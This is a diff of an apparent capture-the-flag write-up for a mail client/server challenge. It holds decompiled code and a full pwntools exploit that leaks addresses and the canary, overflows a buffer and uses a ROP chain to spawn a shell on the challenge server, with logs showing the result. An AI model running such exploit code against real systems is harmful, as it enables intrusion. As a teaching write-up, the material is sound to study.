@@ -47,11 +47,6 @@ if ((open_files() == 0 && dolisten() == 0))
  }
  }
  }
-```
-
-
-
-```
 if (read(eventfd, &cmd, 3) == 3)
  {
  int32_t rax_3 = cmd;
@@ -143,21 +138,11 @@ if (read(eventfd, &cmd, 3) == 3)
  }
  }
  }
-```
-
-
-
-```
 struct packet {
 	uint32_t signal;
 	uint32_t len;
 	char buf[0x400];
 }
-```
-
-
-
-```
 Register - /home/mailserver/data/users/USERNAME is created. /home/mailserver/data/users/USERNAME/passwd has the password(no hash) written to it.
 
 Login - The password is checked. If it is correct, the server sends back an access key NFA9BuWqoExEX5Ll. The access key gives the client unrestricted access to do any operation as any user, however since we can only interface with the mailserver through the limited mailclient, this is not exploitable.
@@ -165,11 +150,6 @@ Login - The password is checked. If it is correct, the server sends back an acce
 Read mail - /home/mailserver/USERNAME is read and sent back to the client.
 
 Send mail - the variables mailto, subject and content_path are read. At /home/mailserver/MAILTO, the data "SUBJECT|CONTENT_PATH" is written.
-```
-
-
-
-```
 printf("Send to: ");
  void var_518;
  __isoc99_scanf("%256[a-zA-Z0-9.@]%*c", &var_518);
@@ -217,11 +197,6 @@ printf("Send to: ");
  close(content_fd);
  chmod(&tempfile_path, 0x1ff);
  free(rax_18);
-```
-
-
-
-```
 char* rax_26 = strrchr(&var_c28.data, 0x7c);
  if (rax_26 == 0)
  {
@@ -255,11 +230,6 @@ char* rax_26 = strrchr(&var_c28.data, 0x7c);
  puts("Content not found!");
  close(rax_33);
  close(rax_3);
-```
-
-
-
-```
 from pwn import *
 e = ELF("./mailclient")
 libc = ELF("./lib/libc.so.6")
@@ -286,7 +256,7 @@ def read():
  subject = p.recvline()[:-1]
  data = p.recvuntil("*")[:-1]
  return subject, data
- 
+
 p = remote("139.162.36.205" if args.REMOTE else "localhost", 1337)
 
 # We just need to interact with the mailclient's update.event file and that gives us arbitrary file write.
@@ -300,21 +270,11 @@ password = "t"
 username = email.split("@")[0]
 
 login(email, password)
-```
-
-
-
-```
 def build_packet(cmd, data,length=None):
  if length is None:
  length = len(data)
  # Builds an update.event packet(for ones that aren't UPD)
  return cmd + str(length).zfill(3).encode() + data
-```
-
-
-
-```
 def build_packet(cmd, data,length=None):
  if length is None:
  length = len(data)
@@ -325,38 +285,19 @@ def send_event(data, content=None):
  if content is None:
  content = "I swear on my life, I always try, but in my eye, I can fly. Better luck next time.\n"
  send("update.event", data, content)
-```
-
-
-
-```
-root@29b3c6292ea3:/home/mailserver/data# cat update.bin
+root@29b3c6292ea3:/home/mailserver/data
+# cat update.bin
 PWNED
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
-└─$ pwn checksec mailclient 
+└─$ pwn checksec mailclient
 [*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
  Arch: amd64-64-little
  RELRO: Full RELRO
  Stack: Canary found
  NX: NX enabled
  PIE: PIE enabled
-```
-
-
-
-```
 read(fd, buf, SIZE);
 write(1,buf,SIZE);
-```
-
-
-
-```
 def custom_mail(username, data, size=None):
  if size is None:
  size = len(data)
@@ -368,11 +309,6 @@ def custom_mail(username, data, size=None):
  send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
  send_event(build_packet(b"NEW", b"pwned",len("pwned") + 1)) # smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
  send_event(build_packet(b"ATE", b"/tmp/evil"))
-```
-
-
-
-```
 custom_mail(username, b"", size=0x10000) # Very high size despite not putting much in the file. This makes it over print, so we can get leaks before exploiting the BOF.
 
 _, leaks = read()
@@ -398,11 +334,6 @@ e.address = u64(leaks[16:16+8]) - 0x2335
 libc.address = u64(leaks[64:64+8]) - 0x29d90
 log.info(f"Binary base: {hex(e.address)}")
 log.info(f"Libc base: {hex(libc.address)}")
-```
-
-
-
-```
 rop = ROP(libc)
 rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)
 
@@ -416,18 +347,8 @@ payload = flat(canary, e.address + 0x4000, rop.chain())
 send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
 send_event(b"NEW" + b"34", payload) # Basically the data written will be NEW34|/tmp/mail/content/FILENAME . 34| will be sscanf'd to get the length as 34 and then the data will be read in as the rest
 send_event(b"ATE" + b"001")
-```
-
-
-
-```
 filname, _ = read()
 log.success(f"Leaked filename: {filname.decode()}")
-```
-
-
-
-```
 # Now ATF is actually useful. We have 4 bytes + payload. We want evil size + 0x804 filler bytes + 4 bytes + payload
 # Unfortunately we cannot write that many bytes in the subject at a time. No worry, it's only a few iterations.
 
@@ -442,20 +363,10 @@ for chunk in chunks[::-1]:
  send_event(build_packet(b"ATF", chunk))
 
 mail_file(username, filname)
-```
-
-
-
-```
 p.sendlineafter("> ", "4")
 p.clean(0.2)
 p.sendline("cd /home/mailclient")
 p.sendline("cat flag*")
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
 └─$ python3.10 exploit.py REMOTE
 [*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
@@ -486,7 +397,7 @@ $ id
 uid=1000(mailclient) gid=1000(mailclient) groups=1000(mailclient)
 $ whoami
 mailclient
-$ 
+$
 [*] Interrupted
 [*] Closed connection to 139.162.36.205 port 1337
 ```
